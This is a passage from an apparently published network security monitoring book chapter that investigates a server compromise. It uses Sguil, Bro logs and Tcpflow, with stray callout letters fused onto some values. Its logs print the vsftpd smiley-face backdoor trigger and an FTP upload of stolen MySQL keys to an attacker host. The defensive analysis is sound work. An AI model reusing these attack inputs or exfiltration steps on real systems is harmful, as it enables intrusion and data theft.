<html><head></head><body>
<p class="calibre1">those passwords, he can access the system directly, rather than needing to </p>
<p class="calibre1">break into it using an exploit. </p>
<p class="calibre1">We now understand a good deal about this case, but is that the end of </p>
<p class="calibre1">the story? </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">What Else Did the Intruder Do? </b></i></p>
<p class="calibre1">In order to determine a bit more about what happened, we need to take </p>
<p class="calibre1">a closer look at two other aspects of this case. First, notice in Figure 10-8 </p>
<p class="calibre1">that 192.168.3.5 wasn’t the only target of 203.0.113.10. We also see activity </p>
<p class="calibre1"><b class="calibre3">222</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p257"/>involving ports 21 and 6200 TCP to 192.168.3.13. We generate a transcript for port 21 TCP to see what happened to 192.168.3.13. Listing 10-10 shows </p>
<p class="calibre1">the result. </p>
<p class="calibre1">Sensor Name:    sovm-eth1</p>
<p class="calibre1">Timestamp:      2013-03-09 21:46:37</p>
<p class="calibre1">Connection ID:  .sovm-eth1_1362865597000002352</p>
<p class="calibre1">Src IP:         203.0.113.10    (Unknown)</p>
<p class="calibre1">Dst IP:         192.168.3.13x    (Unknown)</p>
<p class="calibre1">Src Port:               49220</p>
<p class="calibre1">Dst Port:               21v</p>
<p class="calibre1">OS Fingerprint: 203.0.113.10:49220 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?] (up: 2 hrs) OS Fingerprint:   -&gt; 192.168.3.13:21 (link: ethernet/modem)</p>
<p class="calibre1">DST: 220 (vsFTPd 2.3.5)w</p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: USER 1dxF:)u</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 331 Please specify the password. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: PASS 0ibjZ</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 530 Login incorrect.y</p>
<p class="calibre1">DST:</p>
<p class="calibre1">DST: 500 OOPS:</p>
<p class="calibre1">DST: vsf_sysutil_recv_peek: no data</p>
<p class="calibre1">DST:</p>
<p class="calibre1"> <i class="calibre4">Listing 10-10: Transcript of FTP connection from 203.0.113.10 to 192.168.3.13</i></p>
<p class="calibre1">We can see that the intruder tried the same smiley face attack u against </p>
<p class="calibre1">an FTP server v and w on 192.168.3.13 x, but that he received a rude Login </p>
<p class="calibre1">incorrect error y in return. The attack failed. Furthermore, according to </p>
<p class="calibre1">the NSM session data, no connections were made to port 6200 TCP on </p>
<p class="calibre1">192.168.3.13, which tells us that 192.168.3.13 was not affected by this attack. </p>
<p class="calibre1">Now we must determine what else may have happened to 192.168.3.5. </p>
<p class="calibre1">We saw the intruder connect to the FTP server and interact with a back-</p>
<p class="calibre1">door. Did he do anything beyond that? To answer this question, we run a </p>
<p class="calibre1">new session data query for all sessions involving the victim 192.168.3.5, as </p>
<p class="calibre1">shown in Listing 10-11. The results are shown in Figure 10-11. </p>
<p class="calibre1">WHERE sancp.start_time &gt; '2013-03-09' AND  sancp.src_ip = INET_</p>
<p class="calibre1">ATON('192.168.3.5') AND dst_port!=137 AND dst_port!=138</p>
<p class="calibre1"> <i class="calibre4">Listing 10-11: Search syntax for session data involving 192.168.3.5</i></p>
<p class="calibre1">When running this query, I added commands to ignore ports 137 and </p>
<p class="calibre1">138 because when I first reviewed the data, I saw many irrelevant session </p>
<p class="calibre1">records for these Windows services. Because they are not germane to this </p>
<p class="calibre1">incident, I’ve removed them from the output shown in Figure 10-11. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">223</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p258"/><img src="index-258_1.png" alt="Image 131" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 10-11: Session data for 192.168.3.5</i></p>
<p class="calibre1">We’ve seen some of this activity in earlier results, but our focus here </p>
<p class="calibre1">is 192.168.3.5, not 203.0.113.10. The most interesting new records involve </p>
<p class="calibre1">two new IP addresses in the 203.0.113.0/24 net block: 203.0.113.77 and </p>
<p class="calibre1">203.0.113.4. These two IP addresses appear in the session records begin-</p>
<p class="calibre1">ning at 2013-03-10 01:59:43. Apparently, our original intruder is either </p>
<p class="calibre1">cooperating with colleagues or he controls those systems! </p>
<p class="calibre1">I recommend creating at least notional diagrams of systems involved in </p>
<p class="calibre1">NSM when trying to understand the scope of an incident. You will not iden-</p>
<p class="calibre1">tify all of the infrastructure between victim systems and remote attackers, </p>
<p class="calibre1">but depicting them visually can help you better recognize what is happening </p>
<p class="calibre1">in real-world cases. Figure 10-12 summarizes our current understanding of </p>
<p class="calibre1">all of the systems involved in this case. </p>
<p class="calibre1"><b class="calibre3">exploring the Session data</b></p>
<p class="calibre1">Let’s consider the new sessions unearthed by querying the victim IP address </p>
<p class="calibre1">to determine the scope of the incident, bearing in mind this simple rule: </p>
<p class="calibre1">The only constant in an intrusion is the victim. Intruders may try to obfus-</p>
<p class="calibre1">cate their activities by changing attacking systems, hopping from attacking </p>
<p class="calibre1">platform to attacking platform; incident responders who fixate on attacker </p>
<p class="calibre1">IP addresses will miss these jumps. Keep the victim in mind, and you won’t </p>
<p class="calibre1">be fooled. </p>
<p class="calibre1"><b class="calibre3">224</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p259"/>Intruder 1</p>
<p class="calibre1">Internet</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">NSM</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">Intruder 3</p>
<p class="calibre1">203.0.113.77</p>
<p class="calibre1">203.0.113.4</p>
<p class="calibre1">Test</p>
<p class="calibre1">Network</p>
<p class="calibre1">Tap</p>
<p class="calibre1">Server</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">Desktop</p>
<p class="calibre1">192.168.3.13</p>
<p class="calibre1"> <i class="calibre4">Figure 10-12: Systems observed in this case</i></p>
<p class="calibre1">Notice in Figure 10-11 that we start with the three DNS queries made </p>
<p class="calibre1">by 192.168.3.5 beginning with 2013-03-09 21:40:35. We could use the Sguil </p>
<p class="calibre1">console to try to generate Wireshark output for each session in order to see </p>
<p class="calibre1">the queries and replies, but instead, we’ll refer to DNS logs captured by Bro, </p>
<p class="calibre1">stored in the  <i class="calibre4">/nsm/bro/logs/2013-03-09</i> directory. As you’ll see, the Bro logs are a form of transaction data and metadata. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Searching Bro DNS Logs</b></i></p>
<p class="calibre1">There are many ways to search Bro DNS logs for specific entries. One simple </p>
<p class="calibre1">way is from the command line, as shown in Listing 10-12. </p>
<p class="calibre1">$ <b class="calibre3">zcat dns.21\:31\:10-22\:00\:00.log.gz | bro-cut -d | grep  192.168.3.5 | </b></p>
<p class="calibre1"><b class="calibre3">grep -v WORKGROUP</b></p>
<p class="calibre1"> <i class="calibre4">-- snip --</i></p>
<p class="calibre1">2013-03-09T21:40:35+0000        k3hPbe4s2H2     192.168.3.5u     60307   </p>
<p class="calibre1">192.168.3.1     53      udp     40264   2.3.168.192.in-addr.arpaw        1       </p>
<p class="calibre1">C_INTERNET      12      PTRv     -       -       F       F       T       F       </p>
<p class="calibre1">0   --</p>
<p class="calibre1">2013-03-09T21:47:08+0000        i1zTu4rfvvk     192.168.3.5x     36911   </p>
<p class="calibre1">192.168.3.1     53      udp     62798   www.google.comz  1                  </p>
<p class="calibre1">C_INTERNET      1        A        -       -       F       F       T       F       </p>
<p class="calibre1">0       -       -</p>
<p class="calibre1">2013-03-09T21:47:18+0000        H5Wjg7kx02d     192.168.3.5y     49467   </p>
<p class="calibre1">192.168.3.1     53      udp     32005   www.google.com.localdomain{            1       </p>
<p class="calibre1">C_INTERNET      1        A        -       -       F       F       T       F       </p>
<p class="calibre1">0   --</p>
<p class="calibre1"> <i class="calibre4">Listing 10-12: DNS records logged by Bro</i></p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">225</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p260"/>First, we use zcat, because the Bro log is  <i class="calibre4">gzip</i>-compressed. Next, we pipe the result into bro-cut with the -d switch, which converts Bro’s native Unix </p>
<p class="calibre1">epoch time format into a human-readable version. We then grep for the IP </p>
<p class="calibre1">address of the victim, 192.168.3.5, followed by a grep to ignore (using the -v </p>
<p class="calibre1">switch) any records containing WORKGROUP. Bro’s log contains DNS queries and </p>
<p class="calibre1">replies, as well as logs of NetBIOS name service traffic, which we remove </p>
<p class="calibre1">with bro-cut -d. By default, that syntax omits the headers for these records. </p>
<p class="calibre1">As you can see in Listing 10-12, 192.168.3.5 u queried for a PTR record v </p>
<p class="calibre1">for  <i class="calibre4">2.3.168.192.in-addr.arpa</i> w, which is probably not related to the intrusion. </p>
<p class="calibre1">Then seven minutes later, the system x y queried for  <i class="calibre4">www.google.com</i> z and </p>
<p class="calibre1"> <i class="calibre4">www.google.com.localdomain</i> {. These last two DNS queries correspond to </p>
<p class="calibre1">the intruder’s attempt to ping  <i class="calibre4">www.google.com</i>. Seeing the header in Bro logs </p>
<p class="calibre1">can help us better understand them. One way to see header data is to avoid </p>
<p class="calibre1">piping the output through bro-cut. Instead, limit the output using the head </p>
<p class="calibre1">command, as shown in Listing 10-13. </p>
<p class="calibre1">$ <b class="calibre3">zcat dns.21\:31\:10-22\:00\:00.log.gz  | head</b></p>
<p class="calibre1">#separator \x09</p>
<p class="calibre1">#set_separator  , </p>
<p class="calibre1">#empty_field    (empty)</p>
<p class="calibre1">#unset_field    -</p>
<p class="calibre1">#path   dns</p>
<p class="calibre1">#open   2013-03-09-21-31-10</p>
<p class="calibre1">#fields ts      uid     id.orig_h       id.orig_p       id.resp_h       </p>
<p class="calibre1">id.resp_p       proto   trans_id        query   qclass  qclass_name     qtype   </p>
<p class="calibre1">qtype_name      rcode   rcode_name      AA      TC      RD      RA      Z       </p>
<p class="calibre1">answers      TTLs</p>
<p class="calibre1">#types  time    string  addr    port    addr    port    enum    count   string  </p>
<p class="calibre1">count   string  count   string  count   string  bool    bool    bool    bool    </p>
<p class="calibre1">count   vector[string]  vector[interval]</p>
<p class="calibre1"> <i class="calibre4">Listing 10-13: Fields and datatypes in the Bro DNS log</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Searching Bro SSH Logs</b></i></p>
<p class="calibre1">Following the three DNS entries, Figure 10-11 shows 203.0.113.77 pinging </p>
<p class="calibre1">192.168.3.5 via IP protocol 0, ICMP. This is the first traffic we’ve seen from </p>
<p class="calibre1">203.0.113.77. </p>
<p class="calibre1">The next record shows traffic from 203.0.113.77 to port 22 TCP on </p>
<p class="calibre1">192.168.3.5. This is likely SSH traffic, which we can confirm by looking at full </p>
<p class="calibre1">content data or by checking a few Bro logs. For example, in the  <i class="calibre4">2013-03-10</i> </p>
<p class="calibre1">directory, we see the entry shown in Listing 10-14 in  <i class="calibre4">ssh.log</i>. (Note that in </p>
<p class="calibre1">order to see the headers for the fields, we omit using bro-cut, as we did for </p>
<p class="calibre1">Listing 10-13.) The listing shows the entire log since it contains only one </p>
<p class="calibre1">entry of interest. </p>
<p class="calibre1"><b class="calibre3">226</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p261"/>$ <b class="calibre3">zcat ssh.02\:03\:29-03\:00\:00.log.gz | bro-cut -d</b></p>
<p class="calibre1">2013-03-10T02:01:10+0000        8zAB2nsjjYd     203.0.113.77u    65438   </p>
<p class="calibre1">192.168.3.5v     22      success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11 </p>
<p class="calibre1">FreeBSD-20110503 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1   16678   AU      </p>
<p class="calibre1">-       -       -   -</p>
<p class="calibre1"> <i class="calibre4">Listing 10-14: SSH connection logged by Bro</i></p>
<p class="calibre1">Listing 10-14 shows 203.0.113.77 u connected via SSH to 192.168.3.5 v. </p>
<p class="calibre1">To understand the rest of the fields, we need to know the headers for the </p>
<p class="calibre1">logfile. Listing 10-15 shows the headers in a Bro SSH log followed by the </p>
<p class="calibre1">same SSH record for 203.0.113.77 connecting to 192.168.3.5. </p>
<p class="calibre1">$ <b class="calibre3">zcat ssh.02\:03\:29-03\:00\:00.log.gz</b></p>
<p class="calibre1">#separator \x09</p>
<p class="calibre1">#set_separator  , </p>
<p class="calibre1">#empty_field    (empty)</p>
<p class="calibre1">#unset_field    -</p>
<p class="calibre1">#path   ssh</p>
<p class="calibre1">#open   2013-03-10-02-03-29</p>
<p class="calibre1">#fields ts      uid     id.orig_h       id.orig_p       id.resp_h       </p>
<p class="calibre1">id.resp_p       status  direction       client  server  resp_size       </p>
<p class="calibre1">remote_location.country_code    remote_location.region  remote_location.city    </p>
<p class="calibre1">remote_location.latitude     remote_location.longitude</p>
<p class="calibre1">#types  time    string  addr    port    addr    port    string  enum    string  </p>
<p class="calibre1">string  count   string  string  string  double  double</p>
<p class="calibre1">1362880870.544761       8zAB2nsjjYd     203.0.113.77    65438   </p>
<p class="calibre1">192.168.3.5     22      success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11 </p>
<p class="calibre1">FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v   16678   AU      </p>
<p class="calibre1">-       -       -       -</p>
<p class="calibre1">#close  2013-03-10-03-00-00</p>
<p class="calibre1"> <i class="calibre4">Listing 10-15: SSH connection logged by Bro, with headers</i></p>
<p class="calibre1">The client and server fields are the most interesting. The client is listed </p>
<p class="calibre1">as SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u, and the server is  </p>
<p class="calibre1">SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v. While you can easily identify the </p>
<p class="calibre1">server version of SSH because you own the system, the information that the </p>
<p class="calibre1">client (the intruder) runs FreeBSD may be interesting. Knowing the exact </p>
<p class="calibre1">version of OpenSSH on the client (again, the intruder) may also help you to </p>
<p class="calibre1">attribute the attack or to correlate it with other incident data. </p>
<p class="calibre1">Unfortunately, the contents of the SSH session are encrypted, meaning </p>
<p class="calibre1">that you can’t decipher them using network-centric means. If the system </p>
<p class="calibre1">had a host-centric tool like OSSEC installed, you might have had data avail-</p>
<p class="calibre1">able from the local system for inspection, but the session records show the </p>
<p class="calibre1">SSH session beginning at 2013-03-10 02:01:10 and terminating at 02:03:24. </p>
<p class="calibre1">Can we tell what the intruder did in this encrypted session? The last few ses-</p>
<p class="calibre1">sion records help answer that question. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">227</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p262"/> <i class="calibre4"><b class="calibre3">Searching Bro FTP Logs</b></i></p>
<p class="calibre1">At 2013-03-10 02:02:50 in Figure 10-11, we see an outbound FTP session </p>
<p class="calibre1">from 192.168.3.5 to 203.0.113.4. If this is truly an FTP session, we should be </p>
<p class="calibre1">able to build a transcript to see the contents. We can also quickly check the </p>
<p class="calibre1">Bro FTP log, as shown in Listing 10-16. </p>
<p class="calibre1">$ <b class="calibre3">zcat ftp.02\:03\:11-03\:00\:00.log.gz</b></p>
<p class="calibre1">#separator \x09</p>
<p class="calibre1">#set_separator  , </p>
<p class="calibre1">#empty_field    (empty)</p>
<p class="calibre1">#unset_field    -</p>
<p class="calibre1">#path   ftpv</p>
<p class="calibre1">#open   2013-03-10-02-03-11</p>
<p class="calibre1">#fields ts      uid     id.orig_h       id.orig_p       id.resp_h       </p>
<p class="calibre1">id.resp_p       user    password        command arg     mime_type       mime_</p>
<p class="calibre1">desc       file_size       reply_code      reply_msg       tags    </p>
<p class="calibre1">extraction_file</p>
<p class="calibre1">#types  time    string  addr    port    addr    port    string  string  string  </p>
<p class="calibre1">string  string  string  count   count   string  table[string]   file</p>
<p class="calibre1">1362880986.113638       FVmgKldpQO5     192.168.3.5w     32904   </p>
<p class="calibre1">203.0.113.4x     21      orr     &lt;hidden&gt;        STOR    ftp://203.0.113.4/./</p>
<p class="calibre1">mysql-ssl.tar.gzu    application/x-gzip      gzip compressed data, from </p>
<p class="calibre1">FAT filesystem (MS-DOS, OS/2, NT) -       226     Transfer complete. </p>
<p class="calibre1">-       -</p>
<p class="calibre1">#close  2013-03-10-03-00-00</p>
<p class="calibre1"> <i class="calibre4">Listing 10-16: Bro FTP log</i></p>
<p class="calibre1">Here, we see that someone successfully transferred a file titled  </p>
<p class="calibre1"> <i class="calibre4">mysql-ssl.tar.gz</i> u via FTP v from 192.168.3.5 w to 203.0.113.4 x. The </p>
<p class="calibre1">transcript shows a little more information, as shown in Listing 10-17. </p>
<p class="calibre1">Sensor Name:    sovm-eth1</p>
<p class="calibre1">Timestamp:      2013-03-10 02:02:50</p>
<p class="calibre1">Connection ID:  .sovm-eth1_1362880970000002980</p>
<p class="calibre1">Src IP:         192.168.3.5     (Unknown)</p>
<p class="calibre1">Dst IP:         203.0.113.4     (Unknown)</p>
<p class="calibre1">Src Port:               32904</p>
<p class="calibre1">Dst Port:               21</p>
<p class="calibre1">OS Fingerprint: 192.168.3.5:32904 - Linux 2.6 (newer, 1) (up: 5 hrs)</p>
<p class="calibre1">OS Fingerprint:   -&gt; 203.0.113.4:21 (distance 0, link: ethernet/modem)</p>
<p class="calibre1">DST: 220 freebsdvmw FTP server (Version 6.00LS) ready. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: USER orrv</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 331 Password required for orr. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: PASS bobbyu</p>
<p class="calibre1"><b class="calibre3">228</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p263"/>SRC:</p>
<p class="calibre1">DST: 230 User orr logged in. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: SYST</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 215 UNIX Type: L8 Version: BSD-199506x</p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: TYPE I</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 200 Type set to I. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: PORT 192,168,3,5,128,244</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 200 PORT command successful. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: STOR mysql-ssl.tar.gz</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 150 Opening BINARY mode data connection for 'mysql-ssl.tar.gz'. </p>
<p class="calibre1">DST:</p>
<p class="calibre1"> <i class="calibre4">Listing 10-17: Transcript of intruder FTP command channel to 203.0.113.4</i></p>
<p class="calibre1">I like this guy. His password is bobby u, and his username is orr v. This </p>
<p class="calibre1">FTP server is running on a system that identifies itself as freebsdvm w, with </p>
<p class="calibre1">UNIX Type L8 Version: BSD-199506 x. Again, we could use this information to </p>
<p class="calibre1">possibly link this case with others, if appropriate. </p>
<p class="calibre1">We don’t know what the intruder did to acquire the contents of this file. </p>
<p class="calibre1">Can we determine what’s in it? </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Decoding the Theft of Sensitive Data</b></i></p>
<p class="calibre1">In fact, we can retrieve the  <i class="calibre4">mysql-ssl.tar.gz</i> archive by virtue of the full content data collection performed by our NSM platform. We’ll derive extracted </p>
<p class="calibre1">content data from full content data using the tool that Sguil uses to rebuild </p>
<p class="calibre1">transcripts, called Tcpflow ( <i class="calibre4">https://github.com/simsong/tcpflow</i>). Jeremy Elson wrote the first version of Tcpflow, but in recent years Simson Garfinkel has </p>
<p class="calibre1">assumed responsibility for the project. </p>
<p class="calibre1">Tcpflow reconstructs TCP sessions. For example, in Listing 10-18, we </p>
<p class="calibre1">tell Tcpflow to rebuild all TCP sessions involving port 20, the TCP port used </p>
<p class="calibre1">for the active FTP data channel shown in the session records. </p>
<p class="calibre1">$ <b class="calibre3">tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602 port 20</b>u $ <b class="calibre3">ls</b>v</p>
<p class="calibre1">192.168.003.005.33012-203.000.113.004.00020w  203.000.113.004.00020-192.168.003.005.56377x report.xmly</p>
<p class="calibre1">$ <b class="calibre3">file *</b>z</p>
<p class="calibre1">192.168.003.005.33012-203.000.113.004.00020{: gzip compressed data, from Unix, last modified: Sun Mar 10 02:02:23 2013</p>
<p class="calibre1">203.000.113.004.00020-192.168.003.005.56377|: ASCII text, with CRLF line terminators</p>
<p class="calibre1">report.xml:                                    XML  document text</p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">229</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p264"/>$ <b class="calibre3">cat 203.000.113.004.00020-192.168.003.005.56377</b></p>
<p class="calibre1">total 1936</p>
<p class="calibre1">drwxr-xr-x  2 orr   orr       512 Mar  9 21:03 . </p>
<p class="calibre1">drwxr-xr-x  4 root  wheel     512 Mar  9 20:47 .. </p>
<p class="calibre1">-rw-r--r--  1 orr   orr      1016 Mar  9 20:47 .cshrc</p>
<p class="calibre1">-rw-r--r--  1 orr   orr       254 Mar  9 20:47 .login</p>
<p class="calibre1">-rw-r--r--  1 orr   orr       165 Mar  9 20:47 .login_conf</p>
<p class="calibre1">-rw-------  1 orr   orr       381 Mar  9 20:47 .mail_aliases</p>
<p class="calibre1">-rw-r--r--  1 orr   orr       338 Mar  9 20:47 .mailrc</p>
<p class="calibre1">-rw-r--r--  1 orr   orr       750 Mar  9 20:47 .profile</p>
<p class="calibre1">-rw-------  1 orr   orr       283 Mar  9 20:47 .rhosts</p>
<p class="calibre1">-rw-r--r--  1 orr   orr       980 Mar  9 20:47 .shrc</p>
<p class="calibre1">-rw-r--r--  1 orr   orr    915349 Mar  9 21:03 mysql-ssl.tar.gz}</p>
<p class="calibre1"> <i class="calibre4">Listing 10-18: Tcpflow reconstruction of sessions involving port 20</i></p>
<p class="calibre1">Listing 10-18 first shows how to run Tcpflow against an interesting trace, </p>
<p class="calibre1">with a BPF limiting reconstruction to traffic involving port 20 u. Next, we </p>
<p class="calibre1">see the output of the Tcpflow reconstruction in the form of a directory list-</p>
<p class="calibre1">ing v. The output shows two sides of the network session, in the form of two </p>
<p class="calibre1">files, w and x, and a  <i class="calibre4">report.xml</i> file y describing what Tcpflow did. Next, we use the file z command to show the type of each of those files. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Extracting the Stolen Archive</b></i></p>
<p class="calibre1">The file  <i class="calibre4">192.168.003.005.33012-203.000.113.004.00020</i> { is a  <i class="calibre4">gzip</i> archive transferred during the FTP session. The file  <i class="calibre4">203.000.113.004.00020-192 </i></p>
<p class="calibre1"> <i class="calibre4">.168.003.005.56377</i> | is an ASCII text file, corresponding to a directory listing returned from the FTP server to the client 192.168.3.5. This directory </p>
<p class="calibre1">listing was transferred after the intruder copied  <i class="calibre4">mysql-ssl.tar.gz</i> to the server. </p>
<p class="calibre1">This confirms the successful transfer of  <i class="calibre4">mysql-ssl.tar.gz</i> }, because that file is now listed and stored on an FTP server controlled by the intruder. This </p>
<p class="calibre1">could be bad news for Vivian’s Pets, if that file is a sensitive archive. </p>
<p class="calibre1">Thanks to capturing full content data, we also have a copy of  <i class="calibre4">mysql-ssl </i></p>
<p class="calibre1"> <i class="calibre4">.tar.gz</i> at our disposal. The  <i class="calibre4">gzip</i> archive represented by file  <i class="calibre4">192.168.003.005 </i></p>
<p class="calibre1"> <i class="calibre4">.33012-203.000.113.004.00020</i> { is likely the  <i class="calibre4">mysql-ssl.tar.gz</i> file stolen by the intruder. We extract it using the tar program, as shown in Listing 10-19. As </p>
<p class="calibre1">you can see, it appears to contain the keys associated with a MySQL server. </p>
<p class="calibre1">$ <b class="calibre3">tar -xzvf 192.168.003.005.33012-203.000.113.004.00020</b></p>
<p class="calibre1">mysql-ssl/</p>
<p class="calibre1">mysql-ssl/yassl-1.9.8.zip</p>
<p class="calibre1">mysql-ssl/my.cnf</p>
<p class="calibre1">mysql-ssl/mysqld.gdb</p>
<p class="calibre1">mysql-ssl/mysql-keys/</p>
<p class="calibre1">mysql-ssl/mysql-keys/server-cert.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/ca-cert.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/client-req.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/server-key.pem</p>
<p class="calibre1"><b class="calibre3">230</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p265"/>mysql-ssl/mysql-keys/server-req.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/client-key.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/client-cert.pem</p>
<p class="calibre1">mysql-ssl/mysql-keys/ca-key.pem</p>
<p class="calibre1"> <i class="calibre4">Listing 10-19: Contents of the </i> mysql-ssl .tar .gz <i class="calibre4"> archive stolen by the intruder</i> With this data in hand, the Vivian’s Pets CIRT must summarize what </p>
<p class="calibre1">has happened in order to fully understand the intrusion. </p>
<p class="calibre1"><b class="calibre3">Stepping back</b></p>
<p class="calibre1">At this point in the NSM process, the CIRT should consider what it under-</p>
<p class="calibre1">stands about the intrusion before making recommendations to business </p>
<p class="calibre1">owners. Using illustrations to depict what has happened at each stage is a </p>
<p class="calibre1">helpful analytical step. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Summarizing Stage 1</b></i></p>
<p class="calibre1">Figure 10-13 summarizes the first few phases of this intrusion, which we can </p>
<p class="calibre1">call stage 1. </p>
<p class="calibre1">1. Intruder conducts reconnaissance against two potential victims. </p>
<p class="calibre1">NETWORK SCANNING</p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">Victim 2</p>
<p class="calibre1">192.168.3.13</p>
<p class="calibre1">2. Intruder exploits vsftpd service on Victim 1. </p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">Exploited</p>
<p class="calibre1">3. Intruder connects to backdoor on Victim 1. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">4. Intruder fails to exploit vsftpd service on Victim 2. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Victim 2</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">192.168.3.13</p>
<p class="calibre1">203.0.113.10</p>
<p class="calibre1">Safe</p>
<p class="calibre1"> <i class="calibre4">Figure 10-13: Stage 1 of server-side compromise</i></p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">231</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p266"/>In stage 1, the intruder at 203.0.113.10 conducted network reconnaissance against two computers: 192.168.3.5 and 192.168.3.13. The intruder </p>
<p class="calibre1">found port 21 TCP listening on both systems, so he attempted to compro-</p>
<p class="calibre1">mise that service on both targets. He successfully compromised the vsftpd </p>
<p class="calibre1">server on 192.168.3.5, causing a backdoor to open on port 6200 TCP on </p>
<p class="calibre1">that system. He was not able to use the same technique to gain unauthor-</p>
<p class="calibre1">ized access to 192.168.3.13. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Summarizing Stage 2</b></i></p>
<p class="calibre1">Figure 10-14 summarizes the remainder of this intrusion, called stage 2. </p>
<p class="calibre1">5. Intruder 2 connects via SSH to Victim 1. </p>
<p class="calibre1">SSH CONNECTION</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">203.0.113.77</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">6. Intruder 2 instructs Victim 1 to upload </p>
<p class="calibre1">stolen data to FTP server on Intruder 3. </p>
<p class="calibre1">SSH CONNECTION</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">203.0.113.77</p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">FTP CONNECTION</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">Intruder 3</p>
<p class="calibre1">203.0.113.4</p>
<p class="calibre1"> <i class="calibre4">Figure 10-14: Stage 2 of server-side compromise</i></p>
<p class="calibre1">In stage 2, a new intruder IP address, 203.0.113.77, connects via SSH to </p>
<p class="calibre1">192.168.3.5. While interacting with the victim, the intruder created or dis-</p>
<p class="calibre1">covered an archive titled  <i class="calibre4">mysql-ssl.tar.gz</i>. He then uploaded that archive via FTP to a third system, 203.0.113.4, which may be another FreeBSD system. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Next Steps</b></i></p>
<p class="calibre1">As explained in Chapter 9, escalation and resolution are the two phases fol-</p>
<p class="calibre1">lowing the collection and analysis phases of the NSM workflow. With analy-</p>
<p class="calibre1">sis complete, the CIRT must identify the owners of the affected systems, </p>
<p class="calibre1">and explain the nature of the data identified as being stolen. In turn, the </p>
<p class="calibre1">asset owner must evaluate the impact of the loss of data and simultaneously </p>
<p class="calibre1">authorize the CIRT to take short-term incident containment measures. The </p>
